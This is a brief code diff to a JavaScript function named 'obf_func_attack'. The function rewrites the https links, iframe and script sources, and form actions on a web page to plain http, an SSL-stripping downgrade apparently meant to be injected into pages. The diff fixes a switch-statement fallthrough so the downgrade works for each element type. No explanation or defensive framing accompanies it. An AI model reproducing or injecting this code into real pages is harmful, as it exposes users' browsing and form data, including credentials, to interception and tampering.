@@ -9,10 +9,10 @@
 function obf_func_attack() {
 	document.querySelectorAll("a,iframe,script,form").forEach(function(obf_var_node){
 		switch (obf_var_node.tagName) {
-			case "A": obf_var_node.href && obf_var_node.href.match(/https/i) ? obf_var_node.href = obf_var_node.href.replace(/(http)s/ig, "$1") : "";
-			case "IFRAME": obf_var_node.src && obf_var_node.src.match(/https/i) ? obf_var_node.src = obf_var_node.src.replace(/(http)s/ig, "$1") : "";
-			case "SCRIPT": obf_var_node.src && obf_var_node.src.match(/https/i) ? obf_var_node.src = obf_var_node.src.replace(/(http)s/ig, "$1") : "";
-			case "FORM": obf_var_node.action && obf_var_node.action.match(/https/i) ? obf_var_node.action = obf_var_node.action.replace(/(http)s/ig, "$1") : "";
+			case "A": obf_var_node.href && obf_var_node.href.match(/https/i) ? obf_var_node.href = obf_var_node.href.replace(/(http)s/ig, "$1") : ""; break;
+			case "IFRAME": obf_var_node.src && obf_var_node.src.match(/https/i) ? obf_var_node.src = obf_var_node.src.replace(/(http)s/ig, "$1") : ""; break;
+			case "SCRIPT": obf_var_node.src && obf_var_node.src.match(/https/i) ? obf_var_node.src = obf_var_node.src.replace(/(http)s/ig, "$1") : ""; break;
+			case "FORM": obf_var_node.action && obf_var_node.action.match(/https/i) ? obf_var_node.action = obf_var_node.action.replace(/(http)s/ig, "$1") : ""; break;
 		}
 	});
 }
